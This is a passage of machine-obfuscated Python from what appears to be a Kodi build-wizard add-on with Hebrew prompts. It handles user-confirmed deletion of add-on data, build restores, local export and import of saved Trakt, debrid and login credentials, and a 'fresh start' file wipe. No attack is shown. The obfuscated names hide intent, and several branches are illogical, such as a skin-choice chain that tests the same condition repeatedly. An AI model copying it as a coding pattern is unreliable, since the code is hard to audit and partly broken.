		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,O00O0OOOOOO0OOOO0 ))#line:4624
def removeAddonData (O00O000OOOO0OO00O ,name =None ,over =False ):#line:4626
	if O00O000OOOO0OO00O =='all':#line:4627
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4628
			wiz .cleanHouse (ADDOND )#line:4629
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4630
	elif O00O000OOOO0OO00O =='uninstalled':#line:4631
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4632
			O00O00OO00000O0OO =0 #line:4633
			for O000000OO00OO0000 in glob .glob (os .path .join (ADDOND ,'*')):#line:4634
				OOO0O0O00O0OO0OOO =O000000OO00OO0000 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4635
				if OOO0O0O00O0OO0OOO in EXCLUDES :pass #line:4636
				elif os .path .exists (os .path .join (ADDONS ,OOO0O0O00O0OO0OOO )):pass #line:4637
				else :wiz .cleanHouse (O000000OO00OO0000 );O00O00OO00000O0OO +=1 ;wiz .log (O000000OO00OO0000 );shutil .rmtree (O000000OO00OO0000 )#line:4638
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O00O00OO00000O0OO ))#line:4639
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4640
	elif O00O000OOOO0OO00O =='empty':#line:4641
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4642
			O00O00OO00000O0OO =wiz .emptyfolder (ADDOND )#line:4643
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O00O00OO00000O0OO ))#line:4644
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4645
	else :#line:4646
		OO0O0O00O00000000 =os .path .join (USERDATA ,'addon_data',O00O000OOOO0OO00O )#line:4647
		if O00O000OOOO0OO00O in EXCLUDES :#line:4648
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4649
		elif os .path .exists (OO0O0O00O00000000 ):#line:4650
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,O00O000OOOO0OO00O ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4651
				wiz .cleanHouse (OO0O0O00O00000000 )#line:4652
				try :#line:4653
					shutil .rmtree (OO0O0O00O00000000 )#line:4654
				except :#line:4655
					wiz .log ("Error deleting: %s"%OO0O0O00O00000000 )#line:4656
			else :#line:4657
				wiz .log ('Addon data for %s was not removed'%O00O000OOOO0OO00O )#line:4658
	wiz .refresh ()#line:4659
def restoreit (O00O0O0O000O0O0O0 ):#line:4661
	if O00O0O0O000O0O0O0 =='build':#line:4662
		OO0O00O0O000O00OO =freshStart ('restore')#line:4663
		if OO0O00O0O000O00OO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4664
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary']:#line:4665
		wiz .skinToDefault ()#line:4666
	wiz .restoreLocal (O00O0O0O000O0O0O0 )#line:4667
def restoreextit (O000O0O0O0O00OOOO ):#line:4669
	if O000O0O0O0O00OOOO =='build':#line:4670
		O00OO0000OOO000OO =freshStart ('restore')#line:4671
		if O00OO0000OOO000OO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4672
	wiz .restoreExternal (O000O0O0O0O00OOOO )#line:4673
def buildInfo (OOO000O00OO00O00O ):#line:4675
	if wiz .workingURL (SPEEDFILE )==True :#line:4676
		if wiz .checkBuild (OOO000O00OO00O00O ,'url'):#line:4677
			OOO000O00OO00O00O ,O0OO00000000O00OO ,OO0O000OOO0O0O000 ,O00O0000O0O0OO000 ,O00O0O0O00O0OO000 ,O0OO0O0OO0OOO000O ,O0OO00000O0O0OOO0 ,OO0O0O00OOOOOOO00 ,O0O000O0O0O0O0O00 ,OO000OOOO00O0OO0O ,O000OO0OOOOOOO000 =wiz .checkBuild (OOO000O00OO00O00O ,'all')#line:4678
			OO000OOOO00O0OO0O ='Yes'if OO000OOOO00O0OO0O .lower ()=='yes'else 'No'#line:4679
			OO000000OOO0O0000 ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOO000O00OO00O00O )#line:4680
			OO000000OOO0O0000 +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0OO00000000O00OO )#line:4681
			if not O0OO0O0OO0OOO000O =="http://":#line:4682
				O00OO0O0OOO0OO00O =wiz .themeCount (OOO000O00OO00O00O ,False )#line:4683
				OO000000OOO0O0000 +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (O00OO0O0OOO0OO00O ))#line:4684
			OO000000OOO0O0000 +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O00O0O0O00O0OO000 )#line:4685
			OO000000OOO0O0000 +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO000OOOO00O0OO0O )#line:4686
			OO000000OOO0O0000 +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O000OO0OOOOOOO000 )#line:4687
			wiz .TextBox (ADDONTITLE ,OO000000OOO0O0000 )#line:4688
		else :wiz .log ("Invalid Build Name!")#line:4689
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4690
def buildVideo (OO00O000OO0OO000O ):#line:4692
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4693
	if wiz .workingURL (SPEEDFILE )==True :#line:4694
		OOO000OOO00OO0OO0 =wiz .checkBuild (OO00O000OO0OO000O ,'preview')#line:4695
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%OO00O000OO0OO000O )#line:4696
		if OOO000OOO00OO0OO0 and not OOO000OOO00OO0OO0 =='http://':playVideo (OOO000OOO00OO0OO0 )#line:4697
		else :wiz .log ("[%s]Unable to find url for video preview"%OO00O000OO0OO000O )#line:4698
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4699
def dependsList (OO0OOO000O0O0000O ):#line:4701
	O0OO0000OO0OOOOOO =os .path .join (ADDONS ,OO0OOO000O0O0000O ,'addon.xml')#line:4702
	if os .path .exists (O0OO0000OO0OOOOOO ):#line:4703
		OO000O000OOOO00OO =open (O0OO0000OO0OOOOOO ,mode ='r');OOOO0000OOO0OO000 =OO000O000OOOO00OO .read ();OO000O000OOOO00OO .close ();#line:4704
		O0O0O00OO00000O0O =wiz .parseDOM (OOOO0000OOO0OO000 ,'import',ret ='addon')#line:4705
		OOOO0O0O0O000OOO0 =[]#line:4706
		for OO0O000OOO000OOOO in O0O0O00OO00000O0O :#line:4707
			if not 'xbmc.python'in OO0O000OOO000OOOO :#line:4708
				OOOO0O0O0O000OOO0 .append (OO0O000OOO000OOOO )#line:4709
		return OOOO0O0O0O000OOO0 #line:4710
	return []#line:4711
def manageSaveData (OO00O0O000OOO0OO0 ):#line:4713
	if OO00O0O000OOO0OO0 =='import':#line:4714
		O0O0O0OOO0000O000 =os .path .join (ADDONDATA ,'temp')#line:4715
		if not os .path .exists (O0O0O0OOO0000O000 ):os .makedirs (O0O0O0OOO0000O000 )#line:4716
		O0OO00O00O0000000 =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4717
		if not O0OO00O00O0000000 .endswith ('.zip'):#line:4718
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4719
			return #line:4720
		OOO00O0000000O00O =os .path .join (MYBUILDS ,'SaveData.zip')#line:4721
		OOOOO0O0OO000O000 =xbmcvfs .copy (O0OO00O00O0000000 ,OOO00O0000000O00O )#line:4722
		wiz .log ("%s"%str (OOOOO0O0OO000O000 ))#line:4723
		extract .all (xbmc .translatePath (OOO00O0000000O00O ),O0O0O0OOO0000O000 )#line:4724
		OO000O000000OOOO0 =os .path .join (O0O0O0OOO0000O000 ,'trakt')#line:4725
		OOO0OO0O00O0OOOOO =os .path .join (O0O0O0OOO0000O000 ,'login')#line:4726
		O000O0O00O0O0O0O0 =os .path .join (O0O0O0OOO0000O000 ,'debrid')#line:4727
		O0OO000OO0OO00O00 =0 #line:4728
		if os .path .exists (OO000O000000OOOO0 ):#line:4729
			O0OO000OO0OO00O00 +=1 #line:4730
			OOOOOO000000000O0 =os .listdir (OO000O000000OOOO0 )#line:4731
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4732
			for OO000O0O00O0OOOO0 in OOOOOO000000000O0 :#line:4733
				OO00OO0O000000OO0 =os .path .join (traktit .TRAKTFOLD ,OO000O0O00O0OOOO0 )#line:4734
				O0000OO0OO0OO000O =os .path .join (OO000O000000OOOO0 ,OO000O0O00O0OOOO0 )#line:4735
				if os .path .exists (OO00OO0O000000OO0 ):#line:4736
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO000O0O00O0OOOO0 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4737
					else :os .remove (OO00OO0O000000OO0 )#line:4738
				shutil .copy (O0000OO0OO0OO000O ,OO00OO0O000000OO0 )#line:4739
			traktit .importlist ('all')#line:4740
			traktit .traktIt ('restore','all')#line:4741
		if os .path .exists (OOO0OO0O00O0OOOOO ):#line:4742
			O0OO000OO0OO00O00 +=1 #line:4743
			OOOOOO000000000O0 =os .listdir (OOO0OO0O00O0OOOOO )#line:4744
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4745
			for OO000O0O00O0OOOO0 in OOOOOO000000000O0 :#line:4746
				OO00OO0O000000OO0 =os .path .join (loginit .LOGINFOLD ,OO000O0O00O0OOOO0 )#line:4747
				O0000OO0OO0OO000O =os .path .join (OOO0OO0O00O0OOOOO ,OO000O0O00O0OOOO0 )#line:4748
				if os .path .exists (OO00OO0O000000OO0 ):#line:4749
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO000O0O00O0OOOO0 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4750
					else :os .remove (OO00OO0O000000OO0 )#line:4751
				shutil .copy (O0000OO0OO0OO000O ,OO00OO0O000000OO0 )#line:4752
			loginit .importlist ('all')#line:4753
			loginit .loginIt ('restore','all')#line:4754
		if os .path .exists (O000O0O00O0O0O0O0 ):#line:4755
			O0OO000OO0OO00O00 +=1 #line:4756
			OOOOOO000000000O0 =os .listdir (O000O0O00O0O0O0O0 )#line:4757
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4758
			for OO000O0O00O0OOOO0 in OOOOOO000000000O0 :#line:4759
				OO00OO0O000000OO0 =os .path .join (debridit .REALFOLD ,OO000O0O00O0OOOO0 )#line:4760
				O0000OO0OO0OO000O =os .path .join (O000O0O00O0O0O0O0 ,OO000O0O00O0OOOO0 )#line:4761
				if os .path .exists (OO00OO0O000000OO0 ):#line:4762
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO000O0O00O0OOOO0 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4763
					else :os .remove (OO00OO0O000000OO0 )#line:4764
				shutil .copy (O0000OO0OO0OO000O ,OO00OO0O000000OO0 )#line:4765
			debridit .importlist ('all')#line:4766
			debridit .debridIt ('restore','all')#line:4767
		wiz .cleanHouse (O0O0O0OOO0000O000 )#line:4768
		wiz .removeFolder (O0O0O0OOO0000O000 )#line:4769
		os .remove (OOO00O0000000O00O )#line:4770
		if O0OO000OO0OO00O00 ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4771
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4772
	elif OO00O0O000OOO0OO0 =='export':#line:4773
		OOO00O000000O0OOO =xbmc .translatePath (MYBUILDS )#line:4774
		O000OOOO000O0O0O0 =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4775
		traktit .traktIt ('update','all')#line:4776
		loginit .loginIt ('update','all')#line:4777
		debridit .debridIt ('update','all')#line:4778
		O0OO00O00O0000000 =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4779
		O0OO00O00O0000000 =xbmc .translatePath (O0OO00O00O0000000 )#line:4780
		O0OO0OOO00OO00O0O =os .path .join (OOO00O000000O0OOO ,'SaveData.zip')#line:4781
		OO0OOO0O0000000O0 =zipfile .ZipFile (O0OO0OOO00OO00O0O ,mode ='w')#line:4782
		for O00OOO00OO00OO0O0 in O000OOOO000O0O0O0 :#line:4783
			if os .path .exists (O00OOO00OO00OO0O0 ):#line:4784
				OOOOOO000000000O0 =os .listdir (O00OOO00OO00OO0O0 )#line:4785
				for O0O000000000O0OOO in OOOOOO000000000O0 :#line:4786
					OO0OOO0O0000000O0 .write (os .path .join (O00OOO00OO00OO0O0 ,O0O000000000O0OOO ),os .path .join (O00OOO00OO00OO0O0 ,O0O000000000O0OOO ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4787
		OO0OOO0O0000000O0 .close ()#line:4788
		if O0OO00O00O0000000 ==OOO00O000000O0OOO :#line:4789
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OO0OOO00OO00O0O ))#line:4790
		else :#line:4791
			try :#line:4792
				xbmcvfs .copy (O0OO0OOO00OO00O0O ,os .path .join (O0OO00O00O0000000 ,'SaveData.zip'))#line:4793
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (O0OO00O00O0000000 ,'SaveData.zip')))#line:4794
			except :#line:4795
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OO0OOO00OO00O0O ))#line:4796
def freshStart (install =None ,over =False ):#line:4801
	if USERNAME =='':#line:4802
		ADDON .openSettings ()#line:4803
		sys .exit ()#line:4804
	OOO0000OO00OOO00O =(SPEEDFILE )#line:4805
	(OOO0000OO00OOO00O )#line:4806
	O0OO0OO00000000OO =(wiz .workingURL (OOO0000OO00OOO00O ))#line:4807
	(O0OO0OO00000000OO )#line:4808
	if KEEPTRAKT =='true':#line:4809
		traktit .autoUpdate ('all')#line:4810
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4811
	if KEEPREAL =='true':#line:4812
		debridit .autoUpdate ('all')#line:4813
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4814
	if KEEPLOGIN =='true':#line:4815
		loginit .autoUpdate ('all')#line:4816
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4817
	if over ==True :OOO000O000O0O0OOO =1 #line:4818
	elif install =='restore':OOO000O000O0O0OOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4819
	elif install :OOO000O000O0O0OOO =1 #line:4820
	else :OOO000O000O0O0OOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4821
	if OOO000O000O0O0OOO :#line:4822
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4823
			O0OOO0OO000O0O000 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4824
			skinSwitch .swapSkins (O0OOO0OO000O0O000 )#line:4827
			O0OOO000O00O000O0 =0 #line:4828
			xbmc .sleep (1000 )#line:4829
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0OOO000O00O000O0 <150 :#line:4830
				O0OOO000O00O000O0 +=1 #line:4831
				xbmc .sleep (1000 )#line:4832
				wiz .ebi ('SendAction(Select)')#line:4833
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4834
				wiz .ebi ('SendClick(11)')#line:4835
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4836
			xbmc .sleep (1000 )#line:4837
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4838
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4839
			return #line:4840
		wiz .addonUpdates ('set')#line:4841
		OOOO00O0O00O000OO =os .path .abspath (HOME )#line:4842
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4843
		OO0000O0OOOOOOOO0 =sum ([len (OO0OO000OO0OO00OO )for OO0O0O00000OOOOO0 ,O00O0O0OO0000OO00 ,OO0OO000OO0OO00OO in os .walk (OOOO00O0O00O000OO )]);O0O00OOOO0OO0OO00 =0 #line:4844
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4845
		EXCLUDES .append ('My_Builds')#line:4846
		EXCLUDES .append ('archive_cache')#line:4847
		EXCLUDES .append ('script.module.requests')#line:4848
		EXCLUDES .append ('myfav.anon')#line:4849
		if KEEPREPOS =='true':#line:4850
			OO000O0O0OOOO0000 =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4851
			for O00O0O000O00OO0OO in OO000O0O0OOOO0000 :#line:4852
				O00O0OOO000OO00OO =os .path .split (O00O0O000O00OO0OO [:-1 ])[1 ]#line:4853
				if not O00O0OOO000OO00OO ==EXCLUDES :#line:4854
					EXCLUDES .append (O00O0OOO000OO00OO )#line:4855
		if KEEPSUPER =='true':#line:4856
			EXCLUDES .append ('plugin.program.super.favourites')#line:4857
		if KEEPMOVIELIST =='true':#line:4858
			EXCLUDES .append ('plugin.video.metalliq')#line:4859
		if KEEPMOVIELIST =='true':#line:4860
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:4861
		if KEEPADDONS =='true':#line:4862
			EXCLUDES .append ('addons')#line:4863
		if KEEPTELEMEDIA =='true':#line:4864
			EXCLUDES .append ('plugin.video.telemedia')#line:4865
		EXCLUDES .append ('plugin.video.elementum')#line:4870
		EXCLUDES .append ('script.elementum.burst')#line:4871
		EXCLUDES .append ('script.elementum.burst-master')#line:4872
		EXCLUDES .append ('plugin.video.quasar')#line:4873
		EXCLUDES .append ('script.quasar.burst')#line:4874
		EXCLUDES .append ('skin.estuary')#line:4875
		if KEEPWHITELIST =='true':#line:4878
			O0000O0OOOO0OOOOO =''#line:4879
			O00OOO000OO0O000O =wiz .whiteList ('read')#line:4880
			if len (O00OOO000OO0O000O )>0 :#line:4881
				for O00O0O000O00OO0OO in O00OOO000OO0O000O :#line:4882
					try :OO000O000000O00OO ,O0OO00OO0OO00O0O0 ,O00O0OOOO000O0O00 =O00O0O000O00OO0OO #line:4883
					except :pass #line:4884
					if O00O0OOOO000O0O00 .startswith ('pvr'):O0000O0OOOO0OOOOO =O0OO00OO0OO00O0O0 #line:4885
					OO00O0OO0O0O0O0O0 =dependsList (O00O0OOOO000O0O00 )#line:4886
					for OOO0OO00OO0OOOOO0 in OO00O0OO0O0O0O0O0 :#line:4887
						if not OOO0OO00OO0OOOOO0 in EXCLUDES :#line:4888
							EXCLUDES .append (OOO0OO00OO0OOOOO0 )#line:4889
						OO000O00OO0OOO00O =dependsList (OOO0OO00OO0OOOOO0 )#line:4890
						for OO0O0O00000O0O000 in OO000O00OO0OOO00O :#line:4891
							if not OO0O0O00000O0O000 in EXCLUDES :#line:4892
								EXCLUDES .append (OO0O0O00000O0O000 )#line:4893
					if not O00O0OOOO000O0O00 in EXCLUDES :#line:4894
						EXCLUDES .append (O00O0OOOO000O0O00 )#line:4895
				if not O0000O0OOOO0OOOOO =='':wiz .setS ('pvrclient',O00O0OOOO000O0O00 )#line:4896
		if wiz .getS ('pvrclient')=='':#line:4897
			for O00O0O000O00OO0OO in EXCLUDES :#line:4898
				if O00O0O000O00OO0OO .startswith ('pvr'):#line:4899
					wiz .setS ('pvrclient',O00O0O000O00OO0OO )#line:4900
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4901
		OOO0O0O0OOO0O00OO =wiz .latestDB ('Addons')#line:4902
		for O00000O00OO0OO000 ,OOO0OOOOOOOO00000 ,O00O00OOOO0O0000O in os .walk (OOOO00O0O00O000OO ,topdown =True ):#line:4903
			OOO0OOOOOOOO00000 [:]=[O0O0OO0OO0O0OOO00 for O0O0OO0OO0O0OOO00 in OOO0OOOOOOOO00000 if O0O0OO0OO0O0OOO00 not in EXCLUDES ]#line:4904
			for OO000O000000O00OO in O00O00OOOO0O0000O :#line:4905
				O0O00OOOO0OO0OO00 +=1 #line:4906
				O00O0OOOO000O0O00 =O00000O00OO0OO000 .replace ('/','\\').split ('\\')#line:4907
				O0OOO000O00O000O0 =len (O00O0OOOO000O0O00 )-1 #line:4909
				if O00O0OOOO000O0O00 [O0OOO000O00O000O0 -2 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0OOOO000O0O00 [O0OOO000O00O000O0 ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4910
				elif OO000O000000O00OO =='MyVideos99.db'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4911
				elif OO000O000000O00OO =='MyVideos107.db'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4912
				elif OO000O000000O00OO =='MyVideos116.db'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4913
				elif OO000O000000O00OO =='MyVideos99.db'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4914
				elif OO000O000000O00OO =='MyVideos107.db'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4915
				elif OO000O000000O00OO =='MyVideos116.db'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4916
				elif O00O0OOOO000O0O00 [O0OOO000O00O000O0 -2 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in O00O0OOOO000O0O00 [O0OOO000O00O000O0 ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4917
				elif O00O0OOOO000O0O00 [O0OOO000O00O000O0 -2 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='addon_data'and 'skin.anonymous.mod'in O00O0OOOO000O0O00 [O0OOO000O00O000O0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4918
				elif O00O0OOOO000O0O00 [O0OOO000O00O000O0 -2 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='addon_data'and 'skin.Premium.mod'in O00O0OOOO000O0O00 [O0OOO000O00O000O0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4919
				elif O00O0OOOO000O0O00 [O0OOO000O00O000O0 -2 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='addon_data'and 'skin.anonymous.nox'in O00O0OOOO000O0O00 [O0OOO000O00O000O0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4920
				elif O00O0OOOO000O0O00 [O0OOO000O00O000O0 -2 ]=='userdata'and O00O0OOOO000O0O00 [O0OOO000O00O000O0 -1 ]=='addon_data'and 'skin.phenomenal'in O00O0OOOO000O0O00 [O0OOO000O00O000O0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00000O00OO0OO000 ,OO000O000000O00OO ),xbmc .LOGNOTICE )#line:4921
